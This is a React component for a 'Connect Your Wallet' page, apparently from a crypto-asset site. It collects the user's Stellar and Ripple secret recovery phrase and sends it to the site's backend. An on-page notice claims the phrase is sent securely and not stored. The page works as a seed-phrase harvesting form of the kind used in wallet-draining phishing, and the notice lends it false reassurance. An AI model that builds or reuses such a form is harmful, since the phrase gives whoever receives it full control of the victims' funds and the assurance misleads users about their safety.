import React, { useState, useEffect } from 'react';
import { useNavigate, Link } from 'react-router-dom';

import './ConnectWallet.css';

const ConnectWallet = () => {
  const [user, setUser] = useState(null);
  const [error, setError] = useState('');
  const [phrase, setPhrase] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [success, setSuccess] = useState('');
  const [stellarAddress, setStellarAddress] = useState('');
  const [rippleAddress, setRippleAddress] = useState('');

  const navigate = useNavigate();

  const apiUrl = import.meta.env.VITE_API_URL;
  const token = localStorage.getItem('token');

  useEffect(() => {
    const localUser = JSON.parse(localStorage.getItem('user'));
    if (localUser) {
      setUser(localUser);
      setStellarAddress(localUser.stellarAddress || '');
      setRippleAddress(localUser.rippleAddress || '');
    }
  }, []);

  useEffect(() => {
    const handleStorageChange = () => {
      const localUser = JSON.parse(localStorage.getItem('user'));
      if (localUser) setUser(localUser);
    };
    window.addEventListener('storage', handleStorageChange);
    return () => window.removeEventListener('storage', handleStorageChange);
  }, []);

  const handlePhraseSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setSuccess('');
    setIsLoading(true);

    const words = phrase.trim().split(/\s+/);
    if (![12, 15, 18, 21, 24].includes(words.length)) {
      setError('A secret phrase must contain 12, 15, 18, 21, or 24 words.');
      setIsLoading(false);
      return;
    }

    try {
      const res = await fetch(`${apiUrl}/wallet/connect-phrase`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ phrase: phrase.trim() }),
      });

      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.message || 'Failed to connect wallet.');
      }

      localStorage.setItem('user', JSON.stringify(data));
      setUser(data);
      setStellarAddress(data.stellarAddress);
      setRippleAddress(data.rippleAddress);

      setSuccess('Wallet connected! Fetching your assets...');
      setPhrase(''); // Clear phrase for security
      setTimeout(() => navigate('/user/assets'), 1500);

    } catch (err) {
      setError(err.message || 'An unknown error occurred.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="connect-wallet-page">
      <div className="connect-wallet-container">
        <h1 className="dashboard-title">Connect Your Wallet</h1>
        <p className="dashboard-subtitle">
          Enter your secret phrase to securely connect your Stellar and Ripple wallets.
        </p>

        {error && <div className="alert alert-danger">{error}</div>}
        {success && <div className="alert alert-success">{success}</div>}

        <div className="wallet-card">
          <h2 className="wallet-card-title">Connect with Secret Recovery Phrase</h2>
          <p className="wallet-card-description">
            Enter your 12, 18, or 24-word secret recovery phrase to connect your wallet.
          </p>
          { (stellarAddress || rippleAddress) ? (
            <div className="wallet-connected-info">
              <span className="material-symbols-outlined wallet-connected-icon">check_circle</span>
              <p>Your wallets are already connected.</p>
              {stellarAddress && <strong className="wallet-address" title={stellarAddress}>Stellar: {stellarAddress}</strong>}
              {rippleAddress && <strong className="wallet-address" title={rippleAddress}>Ripple: {rippleAddress}</strong>}
              <button onClick={() => navigate('/user/assets')} className="btn-primary-gradient mt-3">View My Assets</button>
            </div>
          ) : (
            <form onSubmit={handlePhraseSubmit} className="phrase-form">
              <textarea value={phrase} onChange={(e) => setPhrase(e.target.value)} placeholder="Enter your secret phrase..." className="form-control-ticket" rows="3" required disabled={isLoading} />
              <div className="security-notice">
                <span className="material-symbols-outlined">shield</span>
                <span>Your phrase is sent securely and is not stored on our servers.</span>
              </div>
              <button type="submit" className="btn-primary-gradient" disabled={isLoading}>{ isLoading ? 'Connecting...' : 'Connect Wallet' }</button>
            </form>
          )}
        </div>

        <div className="text-center mt-4">
          <Link to="/user/dashboard" className="btn btn-secondary">Back to Dashboard</Link>
        </div>
      </div>
    </div>
  );
};

export default ConnectWallet;
